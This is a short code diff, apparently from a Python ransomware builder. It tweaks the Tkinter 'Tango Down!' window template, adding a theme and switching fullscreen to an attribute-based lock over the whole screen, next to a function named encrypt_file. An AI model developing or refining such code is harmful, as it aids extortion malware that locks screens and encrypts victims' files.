@@ -116,8 +116,10 @@ class mainwindow(Tk):
         self.title(string = "Tango Down!") # Set window title
         self.resizable(0,0) # Do not allow to be resized
         self.configure(background='black')
-        self.overrideredirect(True)
+        #self.overrideredirect(True)
         <fullscreen>
+        self.style = Style()
+        self.style.theme_use("clam")
 
         photo_code = '''<img_base64>
 '''
@@ -322,7 +324,7 @@ def encrypt_file(file_name, key):
 
     if fullscreen == 1:
         # Insert fullscreen code
-        demon = demon.replace('<fullscreen>', 'self.geometry("{0}x{1}+0+0".format(self.winfo_screenwidth(), self.winfo_screenheight()))')
+        demon = demon.replace('<fullscreen>', 'self.attributes("-fullscreen", True)')
     elif fullscreen == 0:
         # Replace setting with empty string
         demon = demon.replace('<fullscreen>', '')
